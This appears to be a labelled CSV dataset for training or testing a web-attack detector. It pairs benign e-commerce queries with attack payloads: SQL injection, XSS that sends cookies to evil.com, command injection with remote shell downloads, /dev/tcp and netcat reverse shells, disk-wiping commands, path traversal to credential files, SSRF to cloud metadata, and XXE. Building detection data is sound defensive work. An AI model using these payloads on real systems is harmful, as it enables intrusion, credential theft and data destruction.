@@ -1,0 +1,225 @@
+payload,label,attack_type
+"' OR '1'='1",1,sqli
+"' OR '1'='1' --",1,sqli
+"1' UNION SELECT username, password FROM users--",1,sqli
+"1 UNION SELECT null,null,null--",1,sqli
+"'; DROP TABLE users; --",1,sqli
+"1'; SELECT * FROM information_schema.tables--",1,sqli
+"admin'--",1,sqli
+"' OR 1=1--",1,sqli
+"1 OR 1=1",1,sqli
+"' OR 'x'='x",1,sqli
+"1; EXEC xp_cmdshell('whoami')--",1,sqli
+"1 UNION ALL SELECT NULL,NULL,NULL--",1,sqli
+"' AND 1=2 UNION SELECT username,password FROM admin--",1,sqli
+"1' AND SLEEP(5)--",1,sqli
+"1' WAITFOR DELAY '0:0:5'--",1,sqli
+"' AND (SELECT * FROM (SELECT(SLEEP(5)))--",1,sqli
+"1 AND 1=2 UNION SELECT 1,2,3--",1,sqli
+"'; INSERT INTO users(name,pass) VALUES('hacker','1234')--",1,sqli
+"1' ORDER BY 3--",1,sqli
+"1' GROUP BY 1--",1,sqli
+"1' HAVING 1=1--",1,sqli
+"1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",1,sqli
+"' UNION SELECT @@version--",1,sqli
+"1'; UPDATE users SET password='hacked' WHERE '1'='1",1,sqli
+"1 OR 'a'='a",1,sqli
+"' OR ''='",1,sqli
+"1; SELECT load_file('/etc/passwd')--",1,sqli
+"' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--",1,sqli
+"1 UNION SELECT table_name FROM information_schema.tables--",1,sqli
+"admin' AND '1'='1",1,sqli
+"1' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>64--",1,sqli
+"' OR BENCHMARK(10000000,MD5(1))--",1,sqli
+"<script>alert('xss')</script>",1,xss
+"<script>alert(document.cookie)</script>",1,xss
+"<img src=x onerror=alert(1)>",1,xss
+"<img src=x onerror='alert(document.domain)'>",1,xss
+"<svg onload=alert(1)>",1,xss
+"<body onload=alert('xss')>",1,xss
+"javascript:alert(1)",1,xss
+"javascript:void(document.write('<script>alert(1)</script>'))",1,xss
+"<a href='javascript:alert(1)'>click</a>",1,xss
+"<iframe src='javascript:alert(1)'></iframe>",1,xss
+"<input type='text' onfocus='alert(1)'>",1,xss
+"<div onmouseover='alert(1)'>hover</div>",1,xss
+"<script>document.location='http://evil.com/'+document.cookie</script>",1,xss
+"<img src=1 onerror='eval(atob(\"YWxlcnQoMSk=\"))'>",1,xss
+"<script>fetch('http://evil.com?c='+btoa(document.cookie))</script>",1,xss
+"<details open ontoggle=alert(1)>",1,xss
+"<video><source onerror=alert(1)>",1,xss
+"<svg><script>alert(1)</script></svg>",1,xss
+"<math><mtext></table></math><img src onerror=alert(1)>",1,xss
+"<base href='javascript:'>",1,xss
+"<form><button formaction='javascript:alert(1)'>click</button></form>",1,xss
+"<style>body{background:url('javascript:alert(1)')}</style>",1,xss
+"&lt;script&gt;alert(1)&lt;/script&gt;",1,xss
+"%3Cscript%3Ealert(1)%3C%2Fscript%3E",1,xss
+"<Script>alert(1)</Script>",1,xss
+"<SCRIPT>alert(1)</SCRIPT>",1,xss
+"<scr<script>ipt>alert(1)</scr</script>ipt>",1,xss
+"<script >alert(1)</script >",1,xss
+"<<script>script>alert(1)<</script>/script>",1,xss
+"; cat /etc/passwd",1,command_injection
+"| whoami",1,command_injection
+"& whoami",1,command_injection
+"; ls -la",1,command_injection
+"| ls -la /bin/sh",1,command_injection
+"; cat /etc/shadow",1,command_injection
+"| id",1,command_injection
+"; id; whoami",1,command_injection
+"`id`",1,command_injection
+"$(id)",1,command_injection
+"; wget http://evil.com/malware.sh",1,command_injection
+"| curl http://evil.com/shell.sh | bash",1,command_injection
+"; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",1,command_injection
+"| nc -e /bin/sh 10.0.0.1 4444",1,command_injection
+"; python -c 'import socket,subprocess,os'",1,command_injection
+"| nmap -sP 192.168.1.0/24",1,command_injection
+"; chmod 777 /etc/passwd",1,command_injection
+"; rm -rf /",1,command_injection
+"| dd if=/dev/zero of=/dev/sda",1,command_injection
+"; kill -9 -1",1,command_injection
+"../../etc/passwd",1,path_traversal
+"../../../etc/shadow",1,path_traversal
+"..%2F..%2F..%2Fetc%2Fpasswd",1,path_traversal
+"..%252f..%252f..%252fetc%252fpasswd",1,path_traversal
+"....//....//....//etc/passwd",1,path_traversal
+"..\..\..\..\windows\system32\config\sam",1,path_traversal
+"..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam",1,path_traversal
+"/etc/passwd",1,path_traversal
+"/etc/shadow",1,path_traversal
+"C:\\windows\\system32\\drivers\\etc\\hosts",1,path_traversal
+"%2e%2e%2f%2e%2e%2fetc%2fpasswd",1,path_traversal
+"..%c0%af..%c0%afetc%c0%afpasswd",1,path_traversal
+"/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",1,path_traversal
+"..%u002f..%u002fetc%u002fpasswd",1,path_traversal
+"..\..\..\windows\win.ini",1,path_traversal
+"../../../proc/self/environ",1,path_traversal
+"/var/log/apache2/access.log",1,path_traversal
+"../../../../etc/hosts",1,path_traversal
+"....//....//etc/passwd",1,path_traversal
+"..././..././etc/passwd",1,path_traversal
+"http://169.254.169.254/latest/meta-data/",1,ssrf
+"http://169.254.169.254/latest/meta-data/iam/security-credentials/",1,ssrf
+"http://127.0.0.1:80/admin",1,ssrf
+"http://localhost/admin",1,ssrf
+"http://0.0.0.0/",1,ssrf
+"http://[::1]/",1,ssrf
+"http://192.168.1.1/admin",1,ssrf
+"http://10.0.0.1/internal",1,ssrf
+"http://172.16.0.1/api",1,ssrf
+"gopher://127.0.0.1:6379/_SLAVEOF 10.0.0.1 6379",1,ssrf
+"file:///etc/passwd",1,ssrf
+"dict://127.0.0.1:11211/stat",1,ssrf
+"ftp://internal-server/secret.txt",1,ssrf
+"http://metadata.google.internal/computeMetadata/v1/",1,ssrf
+"http://100.100.100.200/latest/meta-data/",1,ssrf
+"<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",1,xxe
+"<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",1,xxe
+"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY bar SYSTEM \"file:///etc/hosts\">]><foo>&bar;</foo>",1,xxe
+"<!ENTITY % xxe SYSTEM \"http://evil.com/evil.dtd\">%xxe;",1,xxe
+"<!DOCTYPE root PUBLIC \"-//B/b/EN\" \"http://attacker.com/b.dtd\">",1,xxe
+"<!ENTITY test SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">",1,xxe
+"<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///dev/random\" >]>",1,xxe
+"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://www.attacker.com/malicious.xml\">]>",1,xxe
+"<!ENTITY xxe SYSTEM \"expect://id\">",1,xxe
+"<!ENTITY xxe SYSTEM \"gopher://127.0.0.1:6379/_GET /key\">",1,xxe
+"%27%20OR%20%271%27%3D%271",1,encoded
+"%3Cscript%3Ealert%281%29%3C%2Fscript%3E",1,encoded
+"&#x27;&#x20;OR&#x20;&#x27;1&#x27;&#x3D;&#x27;1",1,encoded
+"\\x27\\x20OR\\x20\\x27\\x31\\x27\\x3D\\x27\\x31",1,encoded
+"%252527%2520OR%2520%2525271%252527%25253D%2525271",1,encoded
+"\\u0027 OR \\u00271\\u0027=\\u00271",1,encoded
+"%27%3B%20DROP%20TABLE%20users%3B--%27",1,encoded
+"%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",1,encoded
+"&#60;script&#62;alert(1)&#60;/script&#62;",1,encoded
+"\x3cscript\x3ealert(1)\x3c/script\x3e",1,encoded
+"search for electronics",0,none
+"get user profile page=1",0,none
+"checkout order id=12345",0,none
+"find products under $50",0,none
+"what is the return policy",0,none
+"how do I reset my password",0,none
+"add item to cart quantity=2",0,none
+"search query: blue shoes size 10",0,none
+"user login email=user@example.com",0,none
+"get order status orderId=789",0,none
+"list all available categories",0,none
+"filter by brand=Nike&color=red",0,none
+"sort by price ascending",0,none
+"page=2 limit=20",0,none
+"get product details id=456",0,none
+"submit review rating=5 productId=123",0,none
+"track shipment trackingNumber=ABC123",0,none
+"update profile firstName=John lastName=Doe",0,none
+"subscribe to newsletter email=test@example.com",0,none
+"search for laptop",0,none
+"get recent orders userId=100",0,none
+"apply coupon code=SAVE10",0,none
+"check inventory productId=789",0,none
+"get recommendations for userId=42",0,none
+"create wishlist name=favorites",0,none
+"POST /api/v1/users Content-Type: application/json",0,none
+"GET /api/products?category=electronics",0,none
+"DELETE /api/cart/item/123",0,none
+"PUT /api/users/456 name=UpdatedName",0,none
+"GET /health-check",0,none
+"username=johndoe&password=securepassword123",0,none
+"query=how to bake a chocolate cake",0,none
+"search=latest smartphone reviews",0,none
+"message=Hello, I need help with my account",0,none
+"feedback=Great product, fast shipping!",0,none
+"comment=This product exceeded my expectations",0,none
+"description=A red t-shirt with logo on front",0,none
+"title=Introduction to Machine Learning",0,none
+"category=books&subcategory=programming",0,none
+"location=New York City",0,none
+"date=2024-01-15&time=14:30:00",0,none
+"GET /api/v1/metrics",0,none
+"Authorization: Bearer eyJhbGciOiJIUzI1NiJ9",0,none
+"Content-Type: application/json; charset=utf-8",0,none
+"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",0,none
+"Accept: text/html,application/xhtml+xml",0,none
+"search term with spaces and numbers 123",0,none
+"normal text without any special characters",0,none
+"product code is AB-123-XYZ",0,none
+"price range 10.99 to 99.99",0,none
+"quantity 5 color blue size medium",0,none
+"get all users from department Engineering",0,none
+"find orders placed between Jan and March",0,none
+"calculate total for items in basket",0,none
+"show me products with rating above 4",0,none
+"how many items are in stock",0,none
+"what are the shipping options available",0,none
+"is express delivery available for my location",0,none
+"how long does standard shipping take",0,none
+"can I return items bought on sale",0,none
+"where is my nearest store location",0,none
+"customer service contact information",0,none
+"how to track my package",0,none
+"loyalty points balance for account 12345",0,none
+"referral code for friend discount",0,none
+"gift wrapping option for order 999",0,none
+"invoice for order number ORD-2024-001",0,none
+"payment method Visa ending in 4242",0,none
+"billing address 123 Main Street",0,none
+"delivery to apartment 4B second floor",0,none
+"special instructions leave at front door",0,none
+"account settings notification preferences",0,none
+"two-factor authentication setup",0,none
+"download my data in CSV format",0,none
+"privacy settings update marketing emails",0,none
+"language preference set to English",0,none
+"currency display USD dollars",0,none
+"time zone setting UTC-5 Eastern",0,none
+"product review 5 stars excellent quality",0,none
+"report seller issue with transaction",0,none
+"dispute order claim damaged package",0,none
+"refund status for order 7654",0,none
+"exchange size medium for large",0,none
+"warranty information for product XYZ",0,none
+"manual for product model ABC-100",0,none
+"FAQ section about returns and refunds",0,none
+"contact us form name email message",0,none
+"blog post about summer fashion trends",0,none
